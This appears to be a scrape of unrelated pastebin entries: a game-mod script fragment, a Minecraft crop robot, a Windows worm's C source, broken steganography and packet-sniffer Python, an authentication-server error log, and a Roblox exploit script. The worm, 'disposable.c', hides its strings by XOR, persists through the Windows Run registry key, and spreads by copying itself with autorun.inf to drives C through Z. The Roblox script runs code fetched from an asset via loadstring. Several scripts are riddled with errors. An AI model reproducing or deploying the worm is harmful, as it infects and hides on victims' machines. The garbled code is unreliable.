				possibleValues = possibleValues.concat(game.managers[6].meta[3].meta.map(arr => arr.name));
				possibleValues = possibleValues.concat(game.managers[6].meta[4].meta.map(arr => arr.name));
				possibleValues = possibleValues.concat(game.managers[6].meta[5].meta.map(arr => arr.name));
				possibleValues = possibleValues.concat(game.managers[6].meta[6].meta.map(arr => arr.name));
				possibleValues = possibleValues.concat(game.managers[6].meta[7].meta.map(arr => arr.name));
				possibleValues = possibleValues.concat(game.managers[6].meta[8].meta.map(arr => arr.name));
				possibleValues = possibleValues.concat(game.managers[6].meta[9].meta.map(arr => arr.name));
				possibleValues = possibleValues.concat(game.managers[6].meta[10].meta.map(arr => arr.name));
				possibleValues = possibleValues.concat(game.managers[6].meta[11].meta.map(arr => arr.name));
				possibleValues = possibleValues.concat(game.managers[6].meta[12].meta.map(arr => arr.name));
				break;

			case ""chronoforge"":
				possibleValues = game.managers[7].meta[0].meta.map(arr => arr.name);
				break;
			case ""voidSpace"":
				possibleValues = game.managers[7].meta[1].meta.map(arr => arr.name);
				break;
			case ""zigguratUpgrades"":
				possibleValues = game.managers[5].meta[0].meta.map(arr => arr.name);
				break;
			case ""religion"":
				possibleValues = game.managers[5].meta[1].meta.map(arr => arr.name);
				break;
			case ""transcendenceUpgrades"":
				possibleValues = game.managers[5].meta[2].meta.map(arr => arr.name);
				
				break;
			case ""pacts"":
				possibleValues = game.managers[5].meta[3].meta.map(arr => arr.name);
			   
				break;
			case ""upgrades"":
				possibleValues = game.managers[0].meta[0].meta.map(arr => arr.name);
		   
				break;
			case ""zebraUpgrades"":
				possibleValues = game.managers[0].meta[1].meta.map(arr => arr.name);
				break;
		}
		
		if(possibleValues)
		{
			game.time.queue.queueSourcesArr[i].possibleValues = possibleValues;
		}
		else
		{
			console.error(""unknow item:"", game.time.queue.queueSourcesArr[i].name);
		}
	}
}

game.mods.sophie.nameToType = function (sName)
{
	for(var i=0 ;i<game.time.queue.queueSourcesArr.length; i++)
	{
		if(game.time.queue.queueSourcesArr[i].possibleValues.includes(sName))
		{
			return game.time.queue.queueSourcesArr[i].name;
		}
	}
	return false;
}


game.mods.sophie.smartBuild = function (sName, iValue = 1)
{
	var sType = game.mods.sophie.nameToType(sName);
	if(!sType)
	{
		console.error(""game.mods.sophie.smartBuild type from item not found in game.time.queue.queueSourcesArr[i].possibleValues"", sName);
	}
	else
	{
		game.mods.sophie.myBuild(sName, sType, iValue);
	}
}

game.mods.sophie.init = function ()
{
	if(!game.mods.sophie.myBuild)
	{	
		game.mods.sophie.genMyBuildFunction();
		game.mods.sophie.fillPossibleValues();
	}
}

game.mods.sophie.init();"
3a51H2Sf,MC:OC bushbot,copperTones,Lua,Friday 7th of July 2023 11:03:52 PM CDT,"-- bushbot.lua
--[[                                   -
Minecraft, Compact Claustrophobia
A robot that harvests and waters an area of crops.
-                                   ]]--
-- bushbot DEPTH WIDTH [-idle=30] [--itr=-1]
local shell = require(""shell"")
local robot = require(""component"").robot

local opt, args = shell.parse(...)
local depth, width = tonumber(opt[1]), tonumber(opt[2])
local idle, itr = tonumber(args.idle) or 30, tonumber(args.itr) or -1

while itr ~= 0 do
    robot.setLightColor(0x00ff00)
    robot.use(0)
    for i=1,width do
        for i=2,depth do
            robot.move(3)
            robot.use(0)
        end
        if i ~= width then
            local cw = i%2 == 0
            robot.turn(cw)
            robot.move(3)
            robot.use(0)
            robot.turn(cw)
        end
    end
    --move back to start line
    if width%2 == 1 then
        robot.turn(false)
        robot.turn(false)
        for i=2,depth do
            robot.move(3)
        end
    end
    robot.turn(false)
    for i=2,width do
        robot.move(3)
    end
    robot.turn(false)
    
    for i=0,15 do
        robot.setLightColor(0x111111*i)
        os.sleep(idle/16)
    end
    itr = math.max(itr-1, -1)
end"
Fu2GtxEr,Worm.Win32.Disposable - Hav0c - Rohitab,FlyFar,C,Friday 7th of July 2023 10:47:30 PM CDT,"/* disposable.c - coded by Hav0c
 
This l33t <span class=""searchlite"">worm</span> is the first one I've made
 
that uses encrypted strings to avoid being
 
too suspicious when opened with hex editors
 
or even windbl0wz notepad. Spreads by copying itself to drives
 
(from C to Z, without checking if they are removable or not).
 
Compiles with Dev-C++ (I run it with WINE).
 
 
 
PS: I hate skiddies
 
PPS: Blasted Mechanism FTW!!1
 
*/
 
 
 
#include <stdio.h>
 
#include <stdlib.h>
 
#include <string.h>
 
#include <windows.h>
 
 
 
 
char teh<span class=""searchlite"">worm</span>[]=""XXpewoicv*a|a""; // \\taskmgr.exe
 
char regkey[]=""WkbpsevaXXImgvkwkbpXXSmj`kswXXGqvvajpRavwmkjXXVqjXX""; // Software\\Microsoft\\Windows\\CurrentVersion\\Run\\
 
 
 
int decrypt(char string[], int key)
 
{
 
    int strsz=strlen(string);
 
    int i;
 
    for(i=0;i<strsz;i++){
 
        string[i] ^= key;
 
    }
 
    return string;
 
}
 
 
 
int CheckForMutex(char tehMutex[])
 
{
 
    HANDLE hMutex;
 
    hMutex=CreateMutex(NULL,1,tehMutex);
 
    if(GetLastError()==ERROR_ALREADY_EXISTS){
 
        ExitProcess(0);
 
    }
 
}
 
 
 
void RootKit(char file[]) // Not a real rootkit obviously, just hides some stuff
 
{
 
    SetFileAttributes(file,FILE_ATTRIBUTE_HIDDEN|FILE_ATTRIBUTE_READONLY|FILE_ATTRIBUTE_SYSTEM);
 
}
 
 
 
void MakeRegKey(char destiny[])
 
{
 
    HKEY hKey;
 
    char buffer[MAX_PATH];
 
    strcpy(buffer,decrypt(""pewoicv"",4)); // taskmgr
 
    if(RegOpenKeyEx(HKEY_LOCAL_MACHINE,decrypt(regkey,4),0,KEY_SET_VALUE,&hKey)||
        RegOpenKeyEx(HKEY_CURRENT_USER,decrypt(regkey,4),0,KEY_SET_VALUE,&hKey)==ERROR_SUCCESS){
 
        RegSetValueEx(hKey,buffer,0,REG_SZ,(const unsigned char *)destiny,sizeof(destiny));
 
        RegCloseKey(hKey);
 
    }
 
    else{
 
        ExitProcess(0);
 
    }
 
}
 
 
 
void DriveSpread(char shizzle[])
 
{
 
    FILE *fp;
 
    int n;
 
    char buffer1[MAX_PATH],buffer2[MAX_PATH],buffer3[MAX_PATH];
 
    strcpy(buffer1,decrypt(""G>XXeqpkvqj*mjb"",4)); // C:\\autorun.inf
 
    strcpy(buffer2,decrypt(""G>XXLer4g*a|a"",4)); // C:\\Hav0c.exe
 
    strcpy(buffer3,decrypt(""_eqpkvqjYXvXjktaj9Ler4g*a|aXvXjWlahhA|agqpa9Ler4g*a|aXvXj"",4)); // [autorun]\r\nopen=Hav0c.exe\r\nShellExecute=Hav0c.exe\r\n
 
    for(n='C';n<='Z';n++){
 
        buffer1[0]=n;
 
        buffer2[0]=n;
 
        if(CopyFile(shizzle,buffer2,0)!=NULL){
 
            RootKit(buffer2);
 
        }
 
        if((fp=fopen(buffer1,writting))!=NULL){
 
            fprintf(fp,buffer3);
 
            fclose(fp);
 
            RootKit(buffer1);
 
        }
 
    }
 
}
 
 
 
int main()
 
{
 
    char sysdir[MAX_PATH];
 
    char <span class=""searchlite"">worm</span>[MAX_PATH];
 
    CheckForMutex(decrypt(""Ler4g[Ksj~[@mk"",4)); // find it out your self
 
    HMODULE GetModH=GetModuleHandle(NULL);
 
    GetModuleFileName(GetModH,<span class=""searchlite"">worm</span>,sizeof(<span class=""searchlite"">worm</span>));
 
    GetSystemDirectory(sysdir,sizeof(sysdir));
 
    strcat(sysdir,decrypt(teh<span class=""searchlite"">worm</span>,4));
 
    CopyFile(<span class=""searchlite"">worm</span>,sysdir,0);
 
    RootKit(sysdir);
 
    MakeRegKey(sysdir);
 
    while(1){
 
        DriveSpread(<span class=""searchlite"">worm</span>);
 
        //Payload here(function not included to avoid �b3r unl33t skiddiz <_<)
 
        Sleep(20000);
 
    }
 
    return 0;
 
}"
KiVubczH,Steganography - Python,FlyFar,Python,Friday 7th of July 2023 10:33:09 PM CDT,"from PIL import image
import binascii
import optparse

def rgb2hex(r,g,b):
	return '#{:02x}{:02x}{:02x}'.format(r,g,b)

def hex2rgb(hexcode):
	return tuple(map(ord,hexcode[1:],decode('hex')))

def str2bin(message):
	binary=bin(int(binascii.hexify(message),16))
	return binary[2:]

def binary2str(binary):
	message=binascii.unhexify('%x' % (int('0b'+binary,2)))
	return message

def encode(hexcode,digit):
	if hexcode[-1] in ('0','1','2','3','4','5'):
		hexcode=hexcode[:-1]+digit
		return hexcode
	else:
		return None

def decode(hexcode):
	if hexcode[-1] in ('0','1'):
		return hexcode[-1]
	else:
		None		

def hide(filename, message):
	img=Image.open(filename)
	binary=str2bin(message)+'1111111111111110'
	if img.mode in ('RGBA'):
		img=img.convert('RGBA')
		datas=image.getdata()
		newData=[]
		digit=0
		temp=''
		for item in datas:
			if (digit<len(binary)):
				newpix=encode(rgb2hex(item[0],item[1],item[2]),binayu[digit])
				if newpix==None:
					newData.append(item)
				else:
					r,g,b=hex2rgb(newpix)
					newData.append((r,g,b,255))
					digit+=1
			else:
				newData.append(item)
		img.putdata(newData)
		img.save(filename,""PNG"")
		return ""Completed!""
	return ""Incorrect Image Mode!!""

def retrieve(filename):
	img=Image.open(filename)
	binary=''

	if img.mode in ('RGBA'):
		img=img.convert('RGBA')
		datas=img.getdata()

		for item in datas:
			digit=decode(rgb2hex(item[0],item[1],item[2]))
			if digit==None:
				pass
			else:
				binary=binary+digit
				if(binary[-16:]==""1111111111111110""):
					print ""Success""
					return bin2str(binary[:-16])
		return bin2str(binary)
	return ""Incorrect Image Mode!!""

def Main():
	parser=optparse.OptionParser('Usage: %prog '+'-e/d <target file>')
	parser.add_option('-e',dest='hide',type=""string"",help=""target picture path to hide text"")
	parser.add_option('-d',dest='retrieve',type=""string"",help=""target picture path to retrieve text"")
	(options.args)=parser.parse.args()
	if (options.hide != None):
		text=raw_input('Enter message:')
		print hide(options.hide,text)
	elif (options.retreive != None):
		print retrieve(options.retrieve)
	else:
		print parser.usage
		exit(0)

if __name__==""__main__"":
	Main()"
KTD8Z9Np,Untitled,AndrewBucklin,JSON,Friday 7th of July 2023 10:32:47 PM CDT,"  {
    ""event"": ""Task started"",
    ""level"": ""info"",
    ""logger"": ""authentik.root.celery"",
    ""pid"": 2070,
    ""task_id"": ""6aca89ae-539c-498a-afa7-ec49ef318719"",
    ""task_name"": ""ldap_sync_single"",
    ""timestamp"": ""2023-07-08T03:11:30.355362""
  },
  {
    ""event"": ""Task failure"",
    ""exc"": ""AttributeError(\""'UUID' object has no attribute 'connection'\"")"",
    ""level"": ""warning"",
    ""logger"": ""authentik.root.celery"",
    ""pid"": 2070,
    ""task_id"": ""task-6aca89ae539c498aafa7ec49ef318719"",
    ""timestamp"": ""2023-07-08T03:11:30.600779""
  },
  {
    ""action"": ""system_exception"",
    ""client_ip"": null,
    ""context"": {
      ""message"": ""Traceback (most recent call last):\n  File \""/usr/local/lib/python3.11/site-packages/celery/app/trace.py\"", line 477, in trace_task\n    R = retval = fun(*args, **kwargs)\n                 ^^^^^^^^^^^^^^^^^^^^\n  File \""/usr/local/lib/python3.11/site-packages/sentry_sdk/integrations/celery.py\"", line 275, in _inner\n    reraise(*exc_info)\n  File \""/usr/local/lib/python3.11/site-packages/sentry_sdk/_compat.py\"", line 60, in reraise\n    raise value\n  File \""/usr/local/lib/python3.11/site-packages/sentry_sdk/integrations/celery.py\"", line 270, in _inner\n    return f(*args, **kwargs)\n           ^^^^^^^^^^^^^^^^^^\n  File \""/usr/local/lib/python3.11/site-packages/celery/app/trace.py\"", line 760, in __protected_call__\n    return self.run(*args, **kwargs)\n           ^^^^^^^^^^^^^^^^^^^^^^^^^\n  File \""/authentik/sources/ldap/tasks.py\"", line 42, in ldap_sync_single\n    task = chain(\n            ^^^^^^\n  File \""/authentik/sources/ldap/tasks.py\"", line 55, in ldap_sync_paginator\n  File \""/authentik/sources/ldap/sync/base.py\"", line 29, in __init__\n    self._connection = source.connection()\n                       ^^^^^^^^^^^^^^^^^\nbuiltins.AttributeError: 'UUID' object has no attribute 'connection'""
    },
    ""event"": ""Created Event"",
    ""level"": ""info"",
    ""logger"": ""authentik.events.models"",
    ""pid"": 2070,
    ""timestamp"": ""2023-07-08T03:11:30.603336"",
    ""user"": {}
  }"
yj9ZxKpY,testJson,nonvpn,JSON,Friday 7th of July 2023 10:31:44 PM CDT,"{
   ""result"":[
      {
         ""servername"":""servername01"",
         ""name"":""servername01"",
         ""online"":""111""
      },
      {
         ""servername"":""servername02"",
         ""name"":""servername02"",
         ""online"":""222""
      },
      {
         ""servername"":""servername03"",
         ""name"":""name03"",
         ""online"":""333""
      },
      {
         ""servername"":""servername04"",
         ""name"":""name04"",
         ""online"":""444""
      }
   ]
}"
Kvz0QsX5,Ethernet Sniffer,FlyFar,Python,Friday 7th of July 2023 10:31:18 PM CDT,"import socket
import textwrap
import struct

TAB_1 = '\t - '
TAB_2 = '\t\t - '
TAB_3 = '\t\t\t - '
TAB_4 = '\t\t\t\t - '

DATA_TAB_1 = '\t   '
DATA_TAB_2 = '\t\t   '
DATA_TAB_3 = '\t\t\t   '
DATA_TAB_4 = '\t\t\t\t   '

def ether_frame(data):
	#unpack etherbet frame
	dest_mac,src_mac,protocol=struct.unpack('! 6s 6s 6s H',data[:14])
	return get_mac_address(dest_mac), get_mac_address(src_mac), socket.htons(protocol), data[14:]

def get_mac_address(bytes_addr):
	#Formats mac address in a proper format(AA:BB:CC:DD:EE:FF)
	bytes_strmap=map('{:02x}'.format, bytes_addr)
	mac_addr=':'.join(bytes_str).upper()
	return mac_addr

def main():
	connection=socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(3))
	while True:
		raw_data,addr=connection.recvfrom(65536)
		dest_mac, src_mac, eth_proto, data = ethernet_frame(raw_data)
		print('\nEthernet Frame:')
		print(TAB_1+'Destination: {}, Source: {}, Protocol: {}'.format(dest_mac,src_mac,eth_proto))

		if eth_proto==8:
			(version,header_length,ttl,proto,src,target,data)=ipv4_packet(data)
			print(TAB_1+'IPv4 Packet:')
			print(TAB_2 + 'Version: {}, Header Length: {}, TTL: {},'.format(version,header_length,ttl))
            print(TAB_2 + 'Protocol: {}, Source: {}, Target: {}'.format(proto, src, target))

		elif eth_proto==1:
			 icmp = ICMP(ipv4.data)
            print(TAB_1 + 'ICMP Packet:')
            print(TAB_2 + 'Type: {}, Code: {}, Checksum: {},'.format(icmp_type,code, checksum))
            print(TAB_2 + 'ICMP Data:')
            print(format_multi_line(DATA_TAB_3, data))

		elif eth_proto == 17:
            src_port,dest_port,length,data = udp_packet(data)
            print(TAB_1 + 'UDP Segment:')
            print(TAB_2 + 'Source Port: {}, Destination Port: {}, Length: {}'.format(src_port,dest_port, size))

		elif eth_proto==6:
			(src_port, dest_port,sequebce, acknowledgement, flag_urg, flag_ack, flag_psh, flag_rst, flag_syn, flag_fin, data)=tcp_packet(data)
			print(TAB_1 + 'TCP Segment:')
            print(TAB_2 + 'Source Port: {}, Destination Port: {}'.format(src_port, dest_port))
            print(TAB_2 + 'Sequence: {}, Acknowledgment: {}'.format(sequence, acknowledgment))
            print(TAB_2 + 'Flags:')
            print(TAB_3 + 'URG: {}, ACK: {}, PSH: {}'.format(flag_urg, flag_ack, flag_psh))
            print(TAB_3 + 'RST: {}, SYN: {}, FIN:{}'.format(flag_rst, flag_syn, flag_fin))
			print(format_multi_line(DATA_TAB_3,data))

		else:
            print(TAB_1 + 'Other IPv4 Data:')
            print(format_multi_line(DATA_TAB_2, data))

def ipv4_packet(data):
	#unpack IP Packet
	version_header_length=data[0]
	version=version_header_length >> 4
	header_length = (version_header_length & 15) * 4
	ttl,protocol,src,dest=struct.unpack('! 8x B B 2x 4s 4s',data[:20])
	return version,header_length, ttl, protocol,ipv4(src),ipv4(dest),data[data_header:]

#Returns Formatted IPv4 Address
def ipv4(addr):
	return '.'.join(map(str,addr))

def icmp_packet(data):
	icmp_type,code,checksum=struct.unpack('! B B H', data[:4])
	return icmp_type,code,checksum,data[4:]

def tcp_packet(data):
	(src_port,dest_port,sequence,acknowledgement,offest_reserved_flags)=struct.unpack('! H H L L H',data[:14])
	offset=(offset_reserved_flags >> 12) * 4
	flag_urg=(offset_reserved_flags & 32)>> 5
	flag_ack=(offset_reserved_flags & 16)>> 4
	flag_psh=(offset_reserved_flags & 8)>>  3
	flag_rst=(offset_reserved_flags & 4)>>2
	flag_syn=(offset_reserved_flags & 2)>>1
	flag_fin=(offset_reserved_flags & 1)
	return src_port, dest_port,sequebce, acknowledgement, flag_urg, flag_ack, flag_psh, flag_rst, flag_syn, flag_fin, data[offset:]


def udp_packet(data):
	src_port, dest_port,size=struct.unpack('! H H 2x H',data[:8])
	return src_port,dest_port,size

def format_multi_line(prefix, string, size=80):
    size -= len(prefix)
    if isinstance(string, bytes):
        string = ''.join(r'\x{:02x}'.format(byte) for byte in string)
        if size % 2:
            size -= 1
    return '\n'.join([prefix + line for line in textwrap.wrap(string, size)])


main()"
WUaHfMDN,lol,Synpase_X,Lua,Friday 7th of July 2023 09:32:21 PM CDT,"-- Hats

-- https://www.roblox.com/catalog/5268602207/Void-Lord-Sword
-- https://www.roblox.com/catalog/4773932088/Evil-Aura


--//====================================================\\--
--||	Void Duel by prostoRobot
--\\====================================================//--
game[""Run Service""].RenderStepped:connect(function()
	settings().Physics.AllowSleep = false
	setsimulationradius(math.huge*math.huge,math.huge*math.huge)
end)
loadstring(game:GetObjects(""rbxassetid://5698675958"")[1].Source)()

local s = Instance.new(""Sound"")

s.Name = ""Sound""
s.SoundId = ""https://web.roblox.com/asset/?id=221057812""
s.Volume = 1
s.Looped = false
s.archivable = false

s.Parent = game.Workspace

wait(1)

s:play()
game:GetService(""StarterGui""):SetCore(""SendNotification"", {
	Title = ""I like eat children"";
	Text = ""Script loaded."";
	Icon = ""rbxthumb://type=Asset&id=4360506542&w=150&h=150""})
Duration = 29;

Player=game:GetService(""Players"").LocalPlayer
Character=Player.Character 
PlayerGui=Player.PlayerGui
Backpack=Player.Backpack 
Torso=Character.Torso 
Head=Character.Head
Humanoid=Character:FindFirstChildOfClass(""Humanoid"")
m=Instance.new('Model',Character)
m2=Instance.new('Model',Character)
effs=Instance.new('Model',Character)
LeftArm=Character[""Left Arm""] 
LeftLeg=Character[""Left Leg""] 
RightArm=Character[""Right Arm""] 
RightLeg=Character[""Right Leg""] 
LS=Torso[""Left Shoulder""] 
LH=Torso[""Left Hip""] 
RS=Torso[""Right Shoulder""] 
RH=Torso[""Right Hip""] 
Face = Head.face
Neck=Torso.Neck
it=Instance.new
attacktype=1
vt=Vector3.new
cf=CFrame.new
euler=CFrame.fromEulerAnglesXYZ
angles=CFrame.Angles
cloaked=false
necko=cf(0, 1, 0, -1, -0, -0, 0, 0, 1, 0, 1, 0)
necko2=cf(0, -0.5, 0, -1, -0, -0, 0, 0, 1, 0, 1, 0)
LHC0=cf(-1,-1,0,-0,-0,-1,0,1,0,1,0,0)
LHC1=cf(-0.5,1,0,-0,-0,-1,0,1,0,1,0,0)
RHC0=cf(1,-1,0,0,0,1,0,1,0,-1,-0,-0)
RHC1=cf(0.5,1,0,0,0,1,0,1,0,-1,-0,-0)
RootPart=Character.HumanoidRootPart
RootJoint=RootPart.RootJoint
RootCF=euler(-1.57,0,3.14)
attack = false 
attackdebounce = false 
deb=false
equipped=true
hand=false
MMouse=nil
combo=0
mana=0
trispeed=.2
attackmode='none'
local idle=0
local Anim=""Idle""
local Effects={}
local gun=false
local shoot=false
player=nil 
mana=0
local CurrentMode = ""Unsheathed""

mouse=Player:GetMouse()
--save shoulders 
RSH, LSH=nil, nil 
--welds 
RW, LW=Instance.new(""Weld""), Instance.new(""Weld"") 
RW.Name=""Right Shoulder"" LW.Name=""Left Shoulder""
LH=Torso[""Left Hip""]
RH=Torso[""Right Hip""]
TorsoColor=Torso.BrickColor
function NoOutline(Part)
	Part.TopSurface,Part.BottomSurface,Part.LeftSurface,Part.RightSurface,Part.FrontSurface,Part.BackSurface = 10,10,10,10,10,10
end
player=Player 
ch=Character
RSH=ch.Torso[""Right Shoulder""] 
LSH=ch.Torso[""Left Shoulder""] 
-- 
RSH.Parent=nil 
LSH.Parent=nil 
-- 
RW.Name=""Right Shoulder""
RW.Part0=ch.Torso 
RW.C0=cf(1.5, 0.5, 0) --* CFrame.fromEulerAnglesXYZ(1.3, 0, -0.5) 
RW.C1=cf(0, 0.5, 0) 
RW.Part1=ch[""Right Arm""] 
RW.Parent=ch.Torso 
-- 
LW.Name=""Left Shoulder""
LW.Part0=ch.Torso 
LW.C0=cf(-1.5, 0.5, 0) --* CFrame.fromEulerAnglesXYZ(1.7, 0, 0.8) 
LW.C1=cf(0, 0.5, 0) 
LW.Part1=ch[""Left Arm""] 
LW.Parent=ch.Torso 

local function weldBetween(a, b)
	local weldd = Instance.new(""ManualWeld"")
	weldd.Part0 = a
	weldd.Part1 = b
	weldd.C0 = CFrame.new()
	weldd.C1 = b.CFrame:inverse() * a.CFrame
	weldd.Parent = a
	return weldd
end

function nooutline(part)
	part.TopSurface,part.BottomSurface,part.LeftSurface,part.RightSurface,part.FrontSurface,part.BackSurface = 10,10,10,10,10,10
end

function part(formfactor,parent,material,reflectance,transparency,brickcolor,name,size)
	local fp=it(""Part"")
	fp.formFactor=formfactor
	fp.Parent=parent
	fp.Reflectance=reflectance
	fp.Transparency=transparency
	fp.CanCollide=false
	fp.Locked=true
	fp.BrickColor=BrickColor.new(tostring(brickcolor))
	fp.Name=name
	fp.Size=size
	fp.Position=Character.Torso.Position
	nooutline(fp)
	fp.Material=material
	fp:BreakJoints()
	return fp
end

ArtificialHB = Instance.new(""BindableEvent"", script)
ArtificialHB.Name = ""Heartbeat""
script:WaitForChild(""Heartbeat"")
frame = 0.015
tf = 0
allowframeloss = false
tossremainder = false
lastframe = tick()
script.Heartbeat:Fire()
game:GetService(""RunService"").Heartbeat:connect(function(s, p)
	tf = tf + s
	if tf >= frame then
		if allowframeloss then
			script.Heartbeat:Fire()
			lastframe = tick()
		else
			for i = 1, math.floor(tf / frame) do
				script.Heartbeat:Fire()
			end
			lastframe = tick()
		end
		if tossremainder then
			tf = 0
		else
			tf = tf - frame * math.floor(tf / frame)
		end
	end
end)
function swait(num)
	if num == 0 or num == nil then
		ArtificialHB.Event:wait(0)
	else
		for i = 0, num do
			ArtificialHB.Event:wait(0)
		end
	end
end

--        function swait(num)
--    if num==0 or num==nil then
--    game:service'RunService'.Heartbeat:wait(0)
--    else
--    for i=0,num do
--    game:service'RunService'.Heartbeat:wait(0)
--    end
--    end
--    end

function mesh(Mesh,part,meshtype,meshid,offset,scale)
	local mesh=it(Mesh)
	mesh.Parent=part
	if Mesh==""SpecialMesh"" then
		mesh.MeshType=meshtype
		mesh.MeshId=meshid
	end
	mesh.Offset=offset
	mesh.Scale=scale
	return mesh
end

function weld(parent,part0,part1,c0,c1)
	local weld=it(""Weld"")
	weld.Parent=parent
	weld.Part0=part0
	weld.Part1=part1
	weld.C0=c0
	weld.C1=c1
	return weld
end


local function CFrameFromTopBack(at, top, back)
	local right = top:Cross(back)
	return CFrame.new(at.x, at.y, at.z,
		right.x, top.x, back.x,
		right.y, top.y, back.y,
		right.z, top.z, back.z)
end

function Triangle(a, b, c)
	local edg1 = (c-a):Dot((b-a).unit)
	local edg2 = (a-b):Dot((c-b).unit)
	local edg3 = (b-c):Dot((a-c).unit)
	if edg1 <= (b-a).magnitude and edg1 >= 0 then
		a, b, c = a, b, c
	elseif edg2 <= (c-b).magnitude and edg2 >= 0 then
		a, b, c = b, c, a
	elseif edg3 <= (a-c).magnitude and edg3 >= 0 then
		a, b, c = c, a, b
	else
		assert(false, ""unreachable"")
	end
	
	local len1 = (c-a):Dot((b-a).unit)
	local len2 = (b-a).magnitude - len1
	local width = (a + (b-a).unit*len1 - c).magnitude
	
	local maincf = CFrameFromTopBack(a, (b-a):Cross(c-b).unit, -(b-a).unit)
	
	local list = {}
	
	if len1 > 0.01 then
		local w1 = Instance.new('WedgePart', m)
		game:GetService(""Debris""):AddItem(w1,5)
		w1.Material = ""SmoothPlastic""
		w1.FormFactor = 'Custom'
		w1.BrickColor = BrickColor.new(""White"")
		w1.Transparency = 0
		w1.Reflectance = 0
		w1.Material = ""Neon""
		w1.CanCollide = false
		NoOutline(w1)
		local sz = Vector3.new(0.2, width, len1)
		w1.Size = sz
		local sp = Instance.new(""SpecialMesh"",w1)
		sp.MeshType = ""Wedge""
		sp.Scale = Vector3.new(0,1,1) * sz/w1.Size
		w1:BreakJoints()
		w1.Anchored = true
		w1.Parent = workspace
		w1.Transparency = 0.3
		table.insert(Effects,{w1,""Disappear"",.03})
		w1.CFrame = maincf*CFrame.Angles(math.pi,0,math.pi/2)*CFrame.new(0,width/2,len1/2)
		table.insert(list,w1)
	end
	if len2 > 0.01 then
		local w2 = Instance.new('WedgePart', m)
		game:GetService(""Debris""):AddItem(w2,5)
		w2.Material = ""SmoothPlastic""
		w2.FormFactor = 'Custom'
		w2.BrickColor = BrickColor.new(""White"")
		w2.Transparency = 0
		w2.Reflectance = 0
		w2.Material = ""Neon""
		w2.CanCollide = false
		NoOutline(w2)
		local sz = Vector3.new(0.2, width, len2)
		w2.Size = sz
		local sp = Instance.new(""SpecialMesh"",w2)
		sp.MeshType = ""Wedge""
		sp.Scale = Vector3.new(0,1,1) * sz/w2.Size
		w2:BreakJoints()
		w2.Anchored = true
		w2.Parent = workspace
		w2.Transparency = 0.3
		table.insert(Effects,{w2,""Disappear"",.03})
		w2.CFrame = maincf*CFrame.Angles(math.pi,math.pi,-math.pi/2)*CFrame.new(0,width/2,-len1 - len2/2)
		table.insert(list,w2)
	end
	return unpack(list)
end


so = function(id,par,vol,pit) 
	coroutine.resume(coroutine.create(function()
		local sou = Instance.new(""Sound"",par or workspace)
		sou.Volume=vol
		sou.Pitch=pit or 1
		sou.SoundId=id
		swait() 
		sou:play() 
		game:GetService(""Debris""):AddItem(sou,6)
	end))
end

function clerp(a,b,t) 
	local qa = {QuaternionFromCFrame(a)}
	local qb = {QuaternionFromCFrame(b)} 
	local ax, ay, az = a.x, a.y, a.z 
	local bx, by, bz = b.x, b.y, b.z
	local _t = 1-t
	return QuaternionToCFrame(_t*ax + t*bx, _t*ay + t*by, _t*az + t*bz,QuaternionSlerp(qa, qb, t)) 
end 

function QuaternionFromCFrame(cf) 
	local mx, my, mz, m00, m01, m02, m10, m11, m12, m20, m21, m22 = cf:components() 
	local trace = m00 + m11 + m22 
	if trace > 0 then 
		local s = math.sqrt(1 + trace) 
		local recip = 0.5/s 
		return (m21-m12)*recip, (m02-m20)*recip, (m10-m01)*recip, s*0.5 
	else 
		local i = 0 
		if m11 > m00 then
			i = 1
		end
		if m22 > (i == 0 and m00 or m11) then 
			i = 2 
		end 
		if i == 0 then 
			local s = math.sqrt(m00-m11-m22+1) 
			local recip = 0.5/s 
			return 0.5*s, (m10+m01)*recip, (m20+m02)*recip, (m21-m12)*recip 
		elseif i == 1 then 
			local s = math.sqrt(m11-m22-m00+1) 
			local recip = 0.5/s 
			return (m01+m10)*recip, 0.5*s, (m21+m12)*recip, (m02-m20)*recip 
		elseif i == 2 then 
			local s = math.sqrt(m22-m00-m11+1) 
			local recip = 0.5/s return (m02+m20)*recip, (m12+m21)*recip, 0.5*s, (m10-m01)*recip 
		end 
	end 
end

function QuaternionToCFrame(px, py, pz, x, y, z, w) 
	local xs, ys, zs = x + x, y + y, z + z 
	local wx, wy, wz = w*xs, w*ys, w*zs 
	local xx = x*xs 
	local xy = x*ys 
	local xz = x*zs 
	local yy = y*ys 
	local yz = y*zs 
	local zz = z*zs 
	return CFrame.new(px, py, pz,1-(yy+zz), xy - wz, xz + wy,xy + wz, 1-(xx+zz), yz - wx, xz - wy, yz + wx, 1-(xx+yy)) 
end

function QuaternionSlerp(a, b, t) 
	local cosTheta = a[1]*b[1] + a[2]*b[2] + a[3]*b[3] + a[4]*b[4] 
	local startInterp, finishInterp; 
	if cosTheta >= 0.0001 then 
		if (1 - cosTheta) > 0.0001 then 
			local theta = math.acos(cosTheta) 
			local invSinTheta = 1/math.sin(theta) 
			startInterp = math.sin((1-t)*theta)*invSinTheta 
			finishInterp = math.sin(t*theta)*invSinTheta  
		else 
			startInterp = 1-t 
			finishInterp = t 
		end 
	else 
		if (1+cosTheta) > 0.0001 then 
			local theta = math.acos(-cosTheta) 
			local invSinTheta = 1/math.sin(theta) 
			startInterp = math.sin((t-1)*theta)*invSinTheta 
			finishInterp = math.sin(t*theta)*invSinTheta 
		else 
			startInterp = t-1 
			finishInterp = t 
		end 
	end 
	return a[1]*startInterp + b[1]*finishInterp, a[2]*startInterp + b[2]*finishInterp, a[3]*startInterp + b[3]*finishInterp, a[4]*startInterp + b[4]*finishInterp 
end

function rayCast(Pos, Dir, Max, Ignore)  -- Origin Position , Direction, MaxDistance , IgnoreDescendants
	return game:service(""Workspace""):FindPartOnRay(Ray.new(Pos, Dir.unit * (Max or 999.999)), Ignore) 
end 

Damagefunc=function(Part,hit,minim,maxim,knockback,Type,Property,Delay,KnockbackType,decreaseblock)
	if hit.Parent==nil then
		return
	end
	local h=hit.Parent:FindFirstChildOfClass(""Humanoid"")
	for _,v in pairs(hit.Parent:GetDescendants()) do
		if v:IsA(""Humanoid"") then
			h=v
		end
	end
	if hit.Parent.Parent:FindFirstChild(""Head"")~=nil then
		h=hit.Parent.Parent:FindFirstChildOfClass(""Humanoid"")
	end
	if hit.Parent:IsA(""Accoutrement"") then
		hit=hit.Parent.Parent:findFirstChild(""Head"")
	end
	if h~=nil and hit.Parent.Name~=Character.Name and hit.Parent:FindFirstChild(""Head"")~=nil then
		if hit.Parent:findFirstChild(""DebounceHit"")~=nil then return end
		Instance.new(""BoolValue"",h.Parent).Name = ""DebounceHit""
